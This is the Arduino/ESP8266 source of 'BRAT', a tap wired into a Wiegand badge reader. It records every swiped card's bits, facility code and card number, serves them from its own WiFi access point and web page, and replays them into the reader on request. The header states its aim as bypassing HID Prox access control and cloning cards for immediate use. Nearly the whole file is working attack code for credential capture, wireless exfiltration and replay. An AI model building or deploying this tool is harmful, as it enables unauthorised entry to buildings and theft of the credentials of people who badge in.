/**
 * BRAT.ino - Badge Reader Active Tap - is designed to
 *                connect to the Data0 & Data1 lines inside of a Wiegand
 *                based card reader.  It will store the card data on the 
 *                file system of an ESP8266-12.  The device sets up
 *                an Access Point that once connected to, presents
 *                a web page.  This web page shows card data info, and allows
 *                replay directly into the card reader.  A proxmark device
 *                can be used to program the card data onto a new card.
 *                The web server also provides a page of Hex vaules used
 *                by the BRAT RPi app. 
 *                
 * When I orginally set out to bypass the HID Prox devices, I did a lot of research        
 * I came along the Tastic RFID Reader by Bishop Fox, 
 * https://www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/
 * as well as a Def Con Talk barse Lares. After building a Tastic Reader I got the 
 * idea that I could some how wirelessly send the card data to someon that could 
 * then wirte a card for immediate use.
 * 
 * The portions of this code that read the signal from the line 
 * and decode the bits into FC and Card Num are the same
 * as what was coded in the Tastic thief.
 * 
 * The follwoing code is orginal to the BRAT
 *   - AP configuration
 *   - Web Server
 *   - Writing to another pair of pins are all orgiinal
 *   - the Trace logic for debugging
 *             
 * Created by osok
 * github https://github.com/osok/BRAT
 */


#include "Config.h"
#include <string.h>
#include <ESP8266WiFi.h>
#include <WiFiClient.h> 
#include <ESP8266WebServer.h>
#include <FS.h>
//#include <ArduinoOTA.h>

#define HOSTNAME "ESP8266-OTA-"

ESP8266WebServer server(80);

#define MAX_BITS 100                 // max number of bits 
#define WEIGAND_WAIT_TIME  3000      // time to wait for another weigand pulse.  


char* dataFile = "cards.htm"; // file to save card ids to
char* hexFile = "card-hex.htm"; // only the card hex is written to this file, one per line

unsigned char databits[MAX_BITS];    // stores all of the data bits
volatile unsigned int bitCount = 0;
unsigned char flagDone;          // goes low when data is currently being captured
unsigned int weigand_counter;        // countdown until we assume there are no more bits

volatile unsigned long facilityCode=0;        // decoded facility code
volatile unsigned long cardCode=0;            // decoded card code

// Breaking up card value into 2 chunks to create 10 char HEX value
volatile unsigned long bitHolder1 = 0;
volatile unsigned long bitHolder2 = 0;
volatile unsigned long cardChunk1 = 0;
volatile unsigned long cardChunk2 = 0;


#define DATA0_IN 5
#define DATA1_IN 4
#define DATA0_OUT 14
#define DATA1_OUT 12

/**
 * These variables are for the writing of the 
 * Bits to the bade reader 
 */
////These were based on timming from ebuging code
//#define SHORT_TIME 7  // 50 microseconds
////#define LONG_TIME 166 // 1 millisecond
//#define LONG_TIME 151 // 1 millisecond (minus overhead for wire writes)
//
// These are based on timing as seen by a logic analyzer
#define SHORT_TIME 655  // 50 microseconds
#define LONG_TIME 27146 // 1 millisecond (Takes into account over head other than the delay loop)
//#define LONG_TIME 16000 // 

int bitcnt1;
int bitcnt2;

unsigned long startTime;
unsigned long shortTime[80];
unsigned long longTime[80];
boolean isAOne[80];
boolean bitUsed[80];
int bitCountToWrite;
unsigned long endTime;


boolean isWriting = false;

///////////////////////////////////////////////////////
// Process interrupts

// interrupt that happens when INTO goes low (0 bit)
//[Copied from the Tastic RFID Thief]
void ISR_INT0()
{
 if(!isWriting){
//  Serial.print("0");
    bitCount++;
    flagDone = 0;
    
    if(bitCount < 23) {
        bitHolder1 = bitHolder1 << 1;
        bitcnt1++;
    }
    else {
        bitHolder2 = bitHolder2 << 1;
        bitcnt2++;
    }
      
    weigand_counter = WEIGAND_WAIT_TIME;  
 }
}

// interrupt that happens when INT1 goes low (1 bit)
//[Copied from the Tastic RFID Thief]
void ISR_INT1()
{
  if(!isWriting){
  //  Serial.print("1");
    databits[bitCount] = 1;
    bitCount++;
    flagDone = 0;
    
     if(bitCount < 23) {
        bitHolder1 = bitHolder1 << 1;
        bitHolder1 |= 1;
        bitcnt1++;
     }
     else {
       bitHolder2 = bitHolder2 << 1;
       bitHolder2 |= 1;
        bitcnt2++;
     }
    
    weigand_counter = WEIGAND_WAIT_TIME;  
  }
}

String getContentType(String filename){
  if(server.hasArg("download")) return "application/octet-stream";
  else if(filename.endsWith(".htm")) return "text/html";
  else if(filename.endsWith(".html")) return "text/html";
  else if(filename.endsWith(".css")) return "text/css";
  else if(filename.endsWith(".js")) return "application/javascript";
  else if(filename.endsWith(".png")) return "image/png";
  else if(filename.endsWith(".gif")) return "image/gif";
  else if(filename.endsWith(".jpg")) return "image/jpeg";
  else if(filename.endsWith(".ico")) return "image/x-icon";
  else if(filename.endsWith(".xml")) return "text/xml";
  else if(filename.endsWith(".pdf")) return "application/x-pdf";
  else if(filename.endsWith(".zip")) return "application/x-zip";
  else if(filename.endsWith(".gz")) return "application/x-gzip";
  return "text/plain";
}

bool handleFileRead(String path){
  Serial.println("handleFileRead: " + path);
  if(path.endsWith("/")) path += "index.htm";
  String contentType = getContentType(path);
  String pathWithGz = path + ".gz";
  if(SPIFFS.exists(pathWithGz) || SPIFFS.exists(path)){
    if(SPIFFS.exists(pathWithGz))
      path += ".gz";
    File file = SPIFFS.open(path, "r");
    size_t sent = server.streamFile(file, contentType);
    file.close();
    return true;
  }
  return false;
}

void handleCard() {
  handleFileRead(dataFile);
}
void handleCardHex() {
  handleFileRead(hexFile);
}


void handleClear() {
  SPIFFS.remove(dataFile);
  SPIFFS.remove(hexFile);
  server.send(200, "text/html", "<html><body>All Clear</body></html>");
}

void handleAccess() {
  unsigned long bitbuf1 = atol(server.arg("byte1").c_str());
  unsigned long  bitbuf2 = atol(server.arg("byte2").c_str());
  int bCnt1 = atol(server.arg("bitcnt1").c_str());
  int bCnt2 = atol(server.arg("bitcnt2").c_str());
  Serial.print("byte1=");
  Serial.println(bitbuf1);
  Serial.print("byte2=");
  Serial.println(bitbuf2);
  Serial.print("bits1=");
  Serial.println(bitbuf1,BIN);
  Serial.print("bits2=");
  Serial.println(bitbuf2, BIN);
  Serial.print("bCnt1=");
  Serial.println(bCnt1);
  Serial.print("bCnt2=");
  Serial.println(bCnt2);

   
  sendBadgeBits(bitbuf1,bitbuf2,bCnt1,bCnt2 );
  //printTimes();
  handleView();
}

void handleView() {
  //This is seperate in order to add eventual formatting around the card page
  server.send(200, "text/html", "<html><body><iframe src=\"/card\" frameborder=\"0\" scrolling=\"no\" width=\"100%\" height=\"100%\"></html>");
}

void setupForRFIDRead(){
  
  pinMode(DATA0_IN, INPUT_PULLUP);     
  pinMode(DATA1_IN, INPUT_PULLUP);   
  delay(500);  
  attachInterrupt(digitalPinToInterrupt(DATA0_IN), ISR_INT0, FALLING);  
  attachInterrupt(digitalPinToInterrupt(DATA1_IN), ISR_INT1, FALLING);
  Serial.println("Ready to read...");
}


void setupForRFIDWrite(){
  pinMode(DATA0_OUT, OUTPUT);     
  pinMode(DATA1_OUT, OUTPUT);    
  digitalWrite(DATA0_OUT, HIGH);
  digitalWrite(DATA1_OUT, HIGH);
  delay(500);
  Serial.println("Ready to write...");
}

void setup() {

  Serial.begin(115200);
  setupForRFIDRead();
  setupForRFIDWrite();
  
  Serial.println();
  Serial.print("Chip ID: 0x");
  Serial.println(ESP.getChipId(), HEX);
  Serial.println();
  String hostname(HOSTNAME);
  hostname += String(ESP.getChipId(), HEX);
  WiFi.hostname(hostname);
  Serial.println("Hostname: " + hostname);
 
  Serial.print("Configuring AP...");

  if (!SPIFFS.begin())
  {
    Serial.println("Failed to mount file system");
    return;
  }

  WiFi.softAP(ssid, password);

  IPAddress myIP = WiFi.softAPIP();
  Serial.print("IP address: ");
  Serial.println(myIP);
  server.on("/clear", handleClear);
  server.on("/view", handleView);
  server.on("/card", handleCard);
  server.on("/hex", handleCardHex);
  server.on("/access", handleAccess);
  server.begin();
  Serial.println("server started");

//  ArduinoOTA.setHostname((const char *)hostname.c_str());
//  ArduinoOTA.begin();

  weigand_counter = WEIGAND_WAIT_TIME;

}

void loop() {
  server.handleClient();
  yield();
//  ArduinoOTA.handle();
//  yield();
  
  // This waits to make sure that there have been no more data pulses before processing data
  if (!flagDone) {

    
    if (--weigand_counter == 0)
      flagDone = 1;  
  }
  
  // if we have bits and we the weigand counter went out
  if (bitCount > 0 && flagDone) {
//    Serial.print("Bitcount 1 = ");
//    Serial.println(bitcnt1);
//    Serial.print("Bitcount 2 = ");
//    Serial.println(bitcnt2);
    
    unsigned char i;

    //Write bits to the wire first thing in order to reduce delay
    sendBadgeBits(bitHolder1,bitHolder2,bitcnt1,bitcnt2 );
    
    getCardValues();
    getCardNumAndSiteCode();
       
    printBits();
    writeDataToFS();

     // cleanup and get ready for the next card
     bitCount = 0; facilityCode = 0; cardCode = 0;
     bitHolder1 = 0; bitHolder2 = 0;
     cardChunk1 = 0; cardChunk2 = 0;
     
     for (i=0; i<MAX_BITS; i++) 
     {
       databits[i] = 0;
     }

     bitcnt1 = 0;
     bitcnt2 = 0;
  }  
}
void printBits(){
      Serial.print(bitCount);
      Serial.print(" bit card. ");
      Serial.print("FC = ");
      Serial.print(facilityCode);
      Serial.print(", CC = ");
      Serial.print(cardCode);
      Serial.print(", 44bit HEX = ");
      Serial.print(cardChunk1, HEX);
      Serial.println(cardChunk2, HEX);
      
  }

  ///////////////////////////////////////////////////////
// SETUP function  [Copied from the Tastic RFID Thief]
void getCardNumAndSiteCode()
{
     unsigned char i;
  
    // we will decode the bits differently depending on how many bits we have
    // see www.pagemac.com/azure/data_formats.php for more info
    // also specifically: https://www.brivo.com/support/card-calculator
    switch (bitCount) {

      
    ///////////////////////////////////////
    // standard 26 bit format
    // facility code = bits 2 to 9  
    case 26:
      for (i=1; i<9; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code = bits 10 to 23
      for (i=9; i<25; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }
      break;

    ///////////////////////////////////////
    // 33 bit HID Generic    
    case 33:  
      for (i=1; i<8; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code
      for (i=8; i<32; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }    
      break;

    ///////////////////////////////////////
    // 34 bit HID Generic 
    case 34:  
      for (i=1; i<17; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code
      for (i=17; i<33; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }    
      break;
 
    ///////////////////////////////////////
    // 35 bit HID Corporate 1000 format
    // facility code = bits 2 to 14     
    case 35:  
      for (i=2; i<14; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code = bits 15 to 34
      for (i=14; i<34; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }    
      break;

    }
    return;
  
}


//////////////////////////////////////
// Function to append the card value (bitHolder1 and bitHolder2) to the necessary array then tranlate that to
// the two chunks for the card value that will be output
// [Copied from the Tastic RFID Thief]
void getCardValues() {
  switch (bitCount) {
    case 26:
        // Example of full card value
        // |>   preamble   <| |>   Actual card value   <|
        // 000000100000000001 11 111000100000100100111000
        // |> write to chunk1 <| |>  write to chunk2   <|
        
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 2){
            bitWrite(cardChunk1, i, 1); // Write preamble 1's to the 13th and 2nd bits
          }
          else if(i > 2) {
            bitWrite(cardChunk1, i, 0); // Write preamble 0's to all other bits above 1
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 20)); // Write remaining bits to cardChunk1 from bitHolder1
          }
          if(i < 20) {
            bitWrite(cardChunk2, i + 4, bitRead(bitHolder1, i)); // Write the remaining bits of bitHolder1 to cardChunk2
          }
          if(i < 4) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i)); // Write the remaining bit of cardChunk2 with bitHolder2 bits
          }
        }
        break;

    case 27:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 3){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 3) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 19));
          }
          if(i < 19) {
            bitWrite(cardChunk2, i + 5, bitRead(bitHolder1, i));
          }
          if(i < 5) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 28:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 4){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 4) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 18));
          }
          if(i < 18) {
            bitWrite(cardChunk2, i + 6, bitRead(bitHolder1, i));
          }
          if(i < 6) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 29:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 5){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 5) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 17));
          }
          if(i < 17) {
            bitWrite(cardChunk2, i + 7, bitRead(bitHolder1, i));
          }
          if(i < 7) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 30:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 6){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 6) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 16));
          }
          if(i < 16) {
            bitWrite(cardChunk2, i + 8, bitRead(bitHolder1, i));
          }
          if(i < 8) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 31:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 7){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 7) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 15));
          }
          if(i < 15) {
            bitWrite(cardChunk2, i + 9, bitRead(bitHolder1, i));
          }
          if(i < 9) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 32:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 8){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 8) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 14));
          }
          if(i < 14) {
            bitWrite(cardChunk2, i + 10, bitRead(bitHolder1, i));
          }
          if(i < 10) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 33:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 9){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 9) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 13));
          }
          if(i < 13) {
            bitWrite(cardChunk2, i + 11, bitRead(bitHolder1, i));
          }
          if(i < 11) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 34:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 10){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 10) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 12));
          }
          if(i < 12) {
            bitWrite(cardChunk2, i + 12, bitRead(bitHolder1, i));
          }
          if(i < 12) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 35:        
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 11){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 11) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 11));
          }
          if(i < 11) {
            bitWrite(cardChunk2, i + 13, bitRead(bitHolder1, i));
          }
          if(i < 13) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 36:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 12){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 12) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 10));
          }
          if(i < 10) {
            bitWrite(cardChunk2, i + 14, bitRead(bitHolder1, i));
          }
          if(i < 14) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 37:
       for(int i = 19; i >= 0; i--) {
          if(i == 13){
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 9));
          }
          if(i < 9) {
            bitWrite(cardChunk2, i + 15, bitRead(bitHolder1, i));
          }
          if(i < 15) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;
  }
  return;
}

/**
 * Used to write the stored badge bits to the wire 
 */
void sendBadgeBits(unsigned long bits1,unsigned long bits2, int bCnt1, int bCnt2){
  isWriting = true;
  setupForRFIDWrite();
  startTime = ESP.getCycleCount(); 
  unsigned long test = 0;
  unsigned long shiftedBits;
  int adjustment;
  bitCountToWrite = 0;
  
//  Setting up the first set of bits
//  Serial.println(bits1, BIN);
 
  for(int i=bCnt1-1;i >= 0; i--){
    if(i>23 ){
      shiftedBits = bits1 >> 24;
      adjustment = 24;
    }else if(i>15 ){
      shiftedBits = bits1 >> 16;
      adjustment = 16;
    }else if(i>7 ){
      shiftedBits = bits1 >> 8;
      adjustment = 8;
    }else {
      shiftedBits = bits1;
      adjustment = 0;
    }
    
    bitCountToWrite++;
    bitUsed[i+bCnt2] = true;
    test = 0;
    test = 1UL << (i-adjustment);
//    Serial.print("adjustment = ");
//    Serial.println(adjustment);
//    Serial.print("Test = ");
//    Serial.println(test, BIN);
    isAOne[i+bCnt2] = (shiftedBits & test);
    
//    Serial.print("Index = ");
//    Serial.println((i+bCnt2));
//    Serial.print("Bit = ");
//    Serial.println(isAOne[i+bCnt2]?"1":"0");
  }

//  Setting up the second set of bits
  for(int i=bCnt2-1;i >= 0; i--){
     if(i>23 ){
      shiftedBits = bits2 >> 24;
      adjustment = 24;
    }else if(i>15 ){
      shiftedBits = bits2 >> 16;
      adjustment = 16;
    }else if(i>7 ){
      shiftedBits = bits2 >> 8;
      adjustment = 8;
    }else {
      shiftedBits = bits2;
      adjustment = 0;
    }
    
    bitCountToWrite++;
    bitUsed[i] = true;
    test = 0;
    test = 1UL << (i-adjustment);
//    Serial.print("adjustment = ");
//    Serial.println(adjustment);
//    Serial.print("Test = ");
//    Serial.println(test, BIN);
    isAOne[i] = (shiftedBits & test);
//    Serial.print("Index = ");
//    Serial.println(i);
//    Serial.print("Bit = ");
//    Serial.println(isAOne[i]?"1":"0");
  }


//  Serial.print("bitCountToWrite = ");
//  Serial.println(bitCountToWrite);

/**
 * This is where the pulses are sent out
 * pulse LOW on DATA0 represents a 0 bit
 * pulse LOW on DATA1 represents a 1 bit
 * The pulse is only 50 micro seconds
 * Then there the line is se high
 * and a pause of 1 millisecond.
 * Though testing i was determined that the 
 * loop between the two digitalWrites is exactly 
 * 50 microseconds.  The second loop takes into 
 * consideration all the over head and buffers
 * to provide a 1 millisecond pause. 
 */
  for(int i=bitCountToWrite-1; i>=0; i--){
    digitalWrite((isAOne[i] ?DATA1_OUT:DATA0_OUT), LOW);
    for(long a=0;a<SHORT_TIME;a++){
       ESP.getCycleCount();
    }
    digitalWrite((isAOne[i]?DATA1_OUT:DATA0_OUT), HIGH);
    shortTime[i] = ESP.getCycleCount();
    
    for(long a=0;a<LONG_TIME;a++){
       ESP.getCycleCount();
    }
    longTime[i] = ESP.getCycleCount();
  }


  endTime = ESP.getCycleCount();  
  Serial.println("");
 
  isWriting = false;
}

/**
 * Used for debugging timming issues with badge bits write
 */
void printTimes(){
  
  Serial.print("bitCountToWrite=");
  Serial.println(bitCountToWrite);
  Serial.println("");
  for(int b = bitCountToWrite-1; b >= 0 ; b--){
    Serial.print(isAOne[b]?"1":"0");
  }
  Serial.println("");
  Serial.println("");
   
  Serial.print("startTime = ");
  Serial.println( startTime );
  Serial.println("");
  Serial.print("Initial loop and first pass = ");
  Serial.println( (shortTime[0]-startTime) );
  Serial.print("delay = ");
  Serial.println( (longTime[0]-shortTime[0]) );

  for(int b = 1; b < bitCountToWrite; b++){
    if(bitUsed[b]){
      Serial.println("");
      Serial.print("Bit[");
      Serial.print(b);
      Serial.println("]");
      Serial.print("pulse = ");
      Serial.println( (shortTime[b]-longTime[b+1]) );
      Serial.print("delay = ");
      Serial.println( (longTime[b]-shortTime[b]) );
      Serial.print("total loop time = ");
      Serial.println( (longTime[b]-longTime[b+1]) );
    }
  }

  Serial.println("");
  Serial.println( endTime );
  Serial.println( (endTime-startTime) );
}


void writeDataToFS(){
  
    File fileHex = SPIFFS.open(hexFile, "a");
    if(bitCount > 20){
      fileHex.print(cardChunk1, HEX);  
      fileHex.print(cardChunk2, HEX);  
      fileHex.print("\r\n");
    }
    fileHex.close();
    
    // open the file. note that only one file can be open at a time,
    // so you have to close this one before opening another.
    File file = SPIFFS.open(dataFile, "a");
        
    if(bitCount > 20){
      file.print("<a href=\"/access?byte1=");
      file.print(bitHolder1);  
      file.print("&bitcnt1=");
      file.print(bitcnt1);  
      file.print("&byte2=");
      file.print(bitHolder2);  
      file.print("&bitcnt2=");
      file.print(bitcnt2);  
      file.print("\">");
      file.print(cardChunk1, HEX);  
      file.print(cardChunk2, HEX);  
      file.print("</a>   ");  
      file.print("FC=");
      file.print(facilityCode);  
      file.print(", CardNum=");  
      file.print(cardCode);  
      file.print(", Wiegand Bits=");  
      file.print(bitHolder1, BIN);  
      file.print(bitHolder2, BIN);  
      file.println("<BR>");  
    }
    file.close();
}

